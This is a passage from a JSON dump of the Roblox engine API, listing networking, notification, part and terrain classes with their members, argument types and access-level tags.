"string","Name":"gameSessionID","Default":null}],"Name":"SetGameSessionID","tags":["RobloxSecurity"],"Class":"NetworkClient","type":"Function"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"replicator","Type":"Instance"}],"Name":"ConnectionAccepted","tags":[],"Class":"NetworkClient","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"code","Type":"int"},{"Name":"reason","Type":"string"}],"Name":"ConnectionFailed","tags":[],"Class":"NetworkClient","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"}],"Name":"ConnectionRejected","tags":[],"Class":"NetworkClient","type":"Event"},{"Superclass":"NetworkPeer","type":"Class","Name":"NetworkServer","tags":["notCreatable"]},{"ValueType":"int","type":"Property","Name":"Port","tags":["readonly"],"Class":"NetworkServer"},{"ReturnType":"void","Arguments":[],"Name":"ConfigureAsCloudEditServer","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ConfigureAsTeamTestServer","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetClientCount","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetIsPlayerAuthenticationRequired","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"port","Default":"0"},{"Type":"int","Name":"threadSleepTime","Default":"20"}],"Name":"Start","tags":["PluginSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"blockDuration","Default":"1000"}],"Name":"Stop","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Function"},{"Arguments":[{"Name":"peer","Type":"Instance"},{"Name":"result","Type":"FilterResult"},{"Name":"instance","Type":"Instance"},{"Name":"member","Type":"string"}],"Name":"DataBasicFiltered","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Event"},{"Arguments":[{"Name":"peer","Type":"Instance"},{"Name":"result","Type":"FilterResult"},{"Name":"instance","Type":"Instance"},{"Name":"member","Type":"string"}],"Name":"DataCustomFiltered","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"replicator","Type":"Instance"}],"Name":"IncommingConnection","tags":["RobloxScriptSecurity"],"Class":"NetworkServer","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkReplicator","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"MachineAddress","tags":["LocalUserSecurity","readonly"],"Class":"NetworkReplicator"},{"ValueType":"int","type":"Property","Name":"Port","tags":["LocalUserSecurity","readonly"],"Class":"NetworkReplicator"},{"ReturnType":"void","Arguments":[],"Name":"CloseConnection","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"DisableProcessPackets","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"EnableProcessPackets","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetPlayer","tags":[],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"verbosityLevel","Default":"0"}],"Name":"GetRakStatsString","tags":["PluginSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestCharacter","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"SendMarker","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetPropSyncExpiration","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"lostConnection","Type":"bool"}],"Name":"Disconnection","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Event"},{"Superclass":"NetworkReplicator","type":"Class","Name":"ClientReplicator","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"request","Default":null}],"Name":"RequestServerStats","tags":["RobloxScriptSecurity"],"Class":"ClientReplicator","type":"Function"},{"Arguments":[{"Name":"stats","Type":"Dictionary"}],"Name":"StatsReceived","tags":["RobloxScriptSecurity"],"Class":"ClientReplicator","type":"Event"},{"Superclass":"NetworkReplicator","type":"Class","Name":"ServerReplicator","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"PreventTerrainChanges","tags":["RobloxPlaceSecurity"],"Class":"ServerReplicator","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetBasicFilteringEnabled","tags":["RobloxPlaceSecurity"],"Class":"ServerReplicator","type":"Function"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"isAuthenticated","Type":"bool"},{"Name":"protocolVersion","Type":"int"}],"Name":"TicketProcessed","tags":[],"Class":"ServerReplicator","type":"Event"},{"ReturnType":"FilterResult","Arguments":[{"Name":"deletingItem","Type":"Instance"}],"Name":"DeleteFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"firingItem","Type":"Instance"},{"Name":"event","Type":"string"}],"Name":"EventFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"newItem","Type":"Instance"},{"Name":"parent","Type":"Instance"}],"Name":"NewFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"changingItem","Type":"Instance"},{"Name":"member","Type":"string"},{"Name":"value","Type":"Variant"}],"Name":"PropertyFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"NetworkSettings","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"ArePhysicsRejectionsReported","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"CanSendPacketBufferLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"ClientPhysicsSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"DataGCRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"DataMtuAdjust","tags":[],"Class":"NetworkSettings"},{"ValueType":"PacketPriority","type":"Property","Name":"DataSendPriority","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"DataSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"EnableHeavyCompression","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ExperimentalPhysicsEnabled","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"ExtraMemoryUsed","tags":["PluginSecurity","hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"FreeMemoryMBytes","tags":["PluginSecurity","hidden","readonly"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"FreeMemoryPoolMBytes","tags":["PluginSecurity","hidden","readonly"],"Class":"NetworkSettings"},{"ValueType":"double","type":"Property","Name":"IncommingReplicationLag","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsQueueErrorComputed","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsThrottledByCongestionControl","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsThrottledByOutgoingBandwidthLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"MaxDataModelSendBuffer","tags":["deprecated"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"NetworkOwnerRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"PhysicsMtuAdjust","tags":[],"Class":"NetworkSettings"},{"ValueType":"PhysicsReceiveMethod","type":"Property","Name":"PhysicsReceive","tags":[],"Class":"NetworkSettings"},{"ValueType":"PhysicsSendMethod","type":"Property","Name":"PhysicsSend","tags":[],"Class":"NetworkSettings"},{"ValueType":"PacketPriority","type":"Property","Name":"PhysicsSendPriority","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"PhysicsSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"PreferredClientPort","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintBits","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintEvents","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintFilters","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintInstances","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintPhysicsErrors","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintProperties","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintSplitMessage","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintStreamInstanceQuota","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintTouches","tags":[],"Class":"NetworkSettings"},{"ValueType":"double","type":"Property","Name":"ReceiveRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"RenderStreamedRegions","tags":[],"Class":"NetworkSettings"},{"ValueType":"string","type":"Property","Name":"ReportStatURL","tags":["deprecated","hidden"],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"SendPacketBufferLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ShowActiveAnimationAsset","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ShowPartMovementWayPoint","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"TotalNumMovementWayPoint","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"TouchSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"TrackDataTypes","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"TrackPhysicsDetails","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"UseInstancePacketCache","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"UsePhysicsPacketCache","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"WaitingForCharacterLogRate","tags":["deprecated","hidden"],"Class":"NetworkSettings"},{"Superclass":"Instance","type":"Class","Name":"NotificationService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"CancelAllNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"alertId","Default":null}],"Name":"CancelNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"alertId","Default":null},{"Type":"string","Name":"alertMsg","Default":null},{"Type":"int","Name":"minutesToFire","Default":null}],"Name":"ScheduleNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetScheduledNotifications","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"NumberValue","tags":[]},{"ValueType":"double","type":"Property","Name":"Value","tags":[],"Class":"NumberValue"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"Changed","tags":[],"Class":"NumberValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"changed","tags":["deprecated"],"Class":"NumberValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ObjectValue","tags":[]},{"ValueType":"Object","type":"Property","Name":"Value","tags":[],"Class":"ObjectValue"},{"Arguments":[{"Name":"value","Type":"Instance"}],"Name":"Changed","tags":[],"Class":"ObjectValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"Instance"}],"Name":"changed","tags":["deprecated"],"Class":"ObjectValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"OneQuarterClusterPacketCacheBase","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PVInstance","tags":["notbrowsable"]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","writeonly"],"Class":"PVInstance"},{"Superclass":"PVInstance","type":"Class","Name":"BasePart","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Anchored","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BackParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BackParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"BackSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"BackSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BottomParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BottomParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"BottomSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"BottomSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"BrickColor","type":"Property","Name":"BrickColor","tags":[],"Class":"BasePart"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BasePart"},{"ValueType":"bool","type":"Property","Name":"CanCollide","tags":[],"Class":"BasePart"},{"ValueType":"Color3","type":"Property","Name":"Color","tags":["deprecated"],"Class":"BasePart"},{"ValueType":"PhysicalProperties","type":"Property","Name":"CustomPhysicalProperties","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Elasticity","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Friction","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"FrontParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"FrontParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"FrontSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"FrontSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LeftParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LeftParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"LeftSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"LeftSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LocalTransparencyModifier","tags":["hidden"],"Class":"BasePart"},{"ValueType":"bool","type":"Property","Name":"Locked","tags":[],"Class":"BasePart"},{"ValueType":"Material","type":"Property","Name":"Material","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"ReceiveAge","tags":["hidden","readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Reflectance","tags":[],"Class":"BasePart"},{"ValueType":"int","type":"Property","Name":"ResizeIncrement","tags":["readonly"],"Class":"BasePart"},{"ValueType":"Faces","type":"Property","Name":"ResizeableFaces","tags":["readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"RightParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"RightParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"RightSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"RightSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"RotVelocity","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Size","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"SpecificGravity","tags":["readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"TopParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"TopParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"TopSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"TopSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BasePart"},{"ValueType":"BrickColor","type":"Property","Name":"brickColor","tags":["deprecated"],"Class":"BasePart"},{"ReturnType":"void","Arguments":[],"Name":"BreakJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"CanSetNetworkOwnership","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"GetConnectedParts","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetMass","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetNetworkOwner","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetNetworkOwnershipAuto","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetRootPart","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetTouchingParts","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsGrounded","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MakeJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"NormalId","Name":"normalId","Default":null},{"Type":"int","Name":"deltaAmount","Default":null}],"Name":"Resize","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"playerInstance","Default":"nil"}],"Name":"SetNetworkOwner","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetNetworkOwnershipAuto","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"breakJoints","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"getMass","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"makeJoints","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"NormalId","Name":"normalId","Default":null},{"Type":"int","Name":"deltaAmount","Default":null}],"Name":"resize","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"Arguments":[{"Name":"part","Type":"Instance"}],"Name":"LocalSimulationTouched","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[],"Name":"OutfitChanged","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"StoppedTouching","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"TouchEnded","tags":[],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"Touched","tags":[],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"touched","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Superclass":"BasePart","type":"Class","Name":"CornerWedgePart","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"FormFactorPart","tags":[]},{"ValueType":"FormFactor","type":"Property","Name":"FormFactor","tags":["deprecated"],"Class":"FormFactorPart"},{"ValueType":"FormFactor","type":"Property","Name":"formFactor","tags":["deprecated","hidden"],"Class":"FormFactorPart"},{"Superclass":"FormFactorPart","type":"Class","Name":"Part","tags":[]},{"ValueType":"PartType","type":"Property","Name":"Shape","tags":[],"Class":"Part"},{"Superclass":"Part","type":"Class","Name":"FlagStand","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"FlagStand"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"FlagCaptured","tags":[],"Class":"FlagStand","type":"Event"},{"Superclass":"Part","type":"Class","Name":"Platform","tags":[]},{"Superclass":"Part","type":"Class","Name":"Seat","tags":[]},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"Seat"},{"ValueType":"Object","type":"Property","Name":"Occupant","tags":["readonly"],"Class":"Seat"},{"Superclass":"Part","type":"Class","Name":"SkateboardPlatform","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Controller","tags":["readonly"],"Class":"SkateboardPlatform"},{"ValueType":"Object","type":"Property","Name":"ControllingHumanoid","tags":["readonly"],"Class":"SkateboardPlatform"},{"ValueType":"int","type":"Property","Name":"Steer","tags":[],"Class":"SkateboardPlatform"},{"ValueType":"bool","type":"Property","Name":"StickyWheels","tags":[],"Class":"SkateboardPlatform"},{"ValueType":"int","type":"Property","Name":"Throttle","tags":[],"Class":"SkateboardPlatform"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"impulseWorld","Default":null}],"Name":"ApplySpecificImpulse","tags":[],"Class":"SkateboardPlatform","type":"Function"},{"Arguments":[{"Name":"humanoid","Type":"Instance"},{"Name":"skateboardController","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"newState","Type":"MoveState"},{"Name":"oldState","Type":"MoveState"}],"Name":"MoveStateChanged","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"}],"Name":"Unequipped","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"},{"Name":"skateboardController","Type":"Instance"}],"Name":"equipped","tags":["deprecated"],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"}],"Name":"unequipped","tags":["deprecated"],"Class":"SkateboardPlatform","type":"Event"},{"Superclass":"Part","type":"Class","Name":"SpawnLocation","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowTeamChangeOnTouch","tags":[],"Class":"SpawnLocation"},{"ValueType":"int","type":"Property","Name":"Duration","tags":[],"Class":"SpawnLocation"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"SpawnLocation"},{"ValueType":"bool","type":"Property","Name":"Neutral","tags":[],"Class":"SpawnLocation"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"SpawnLocation"},{"Superclass":"FormFactorPart","type":"Class","Name":"WedgePart","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"MeshPart","tags":[]},{"ValueType":"Material","type":"Property","Name":"Material","tags":["deprecated","readonly"],"Class":"MeshPart"},{"ValueType":"Content","type":"Property","Name":"TextureID","tags":[],"Class":"MeshPart"},{"Superclass":"BasePart","type":"Class","Name":"ParallelRampPart","tags":["deprecated","notbrowsable"]},{"Superclass":"BasePart","type":"Class","Name":"PartOperation","tags":[]},{"ValueType":"bool","type":"Property","Name":"UsePartColor","tags":[],"Class":"PartOperation"},{"Superclass":"PartOperation","type":"Class","Name":"NegateOperation","tags":[]},{"Superclass":"PartOperation","type":"Class","Name":"UnionOperation","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"PrismPart","tags":["deprecated","notbrowsable"]},{"ValueType":"PrismSides","type":"Property","Name":"Sides","tags":[],"Class":"PrismPart"},{"Superclass":"BasePart","type":"Class","Name":"PyramidPart","tags":["deprecated","notbrowsable"]},{"ValueType":"PyramidSides","type":"Property","Name":"Sides","tags":[],"Class":"PyramidPart"},{"Superclass":"BasePart","type":"Class","Name":"RightAngleRampPart","tags":["deprecated","notbrowsable"]},{"Superclass":"BasePart","type":"Class","Name":"Terrain","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"IsSmooth","tags":["readonly"],"Class":"Terrain"},{"ValueType":"Region3int16","type":"Property","Name":"MaxExtents","tags":["readonly"],"Class":"Terrain"},{"ValueType":"Color3","type":"Property","Name":"WaterColor","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterTransparency","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterWaveSize","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterWaveSpeed","tags":[],"Class":"Terrain"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"AutowedgeCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3int16","Name":"region","Default":null}],"Name":"AutowedgeCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"CellCenterToWorld","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"CellCornerToWorld","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Clear","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ConvertToSmooth","tags":["PluginSecurity"],"Class":"Terrain","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Region3int16","Name":"region","Default":null}],"Name":"CopyRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"CountCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"center","Default":null},{"Type":"float","Name":"radius","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillBall","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null},{"Type":"Vector3","Name":"size","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillBlock","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"GetCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"GetWaterCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"region","Default":null},{"Type":"Vector3int16","Name":"corner","Default":null},{"Type":"bool","Name":"pasteEmptyCells","Default":null}],"Name":"PasteRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null}],"Name":"ReadVoxels","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null},{"Type":"CellMaterial","Name":"material","Default":null},{"Type":"CellBlock","Name":"block","Default":null},{"Type":"CellOrientation","Name":"orientation","Default":null}],"Name":"SetCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3int16","Name":"region","Default":null},{"Type":"CellMaterial","Name":"material","Default":null},{"Type":"CellBlock","Name":"block","Default":null},{"Type":"CellOrientation","Name":"orientation","Default":null}],"Name":"SetCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null},{"Type":"WaterForce","Name":"force","Default":null},{"Type":"WaterDirection","Name":"direction","Default":null}],"Name":"SetWaterCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCellPreferEmpty","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCellPreferSolid","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3","Name":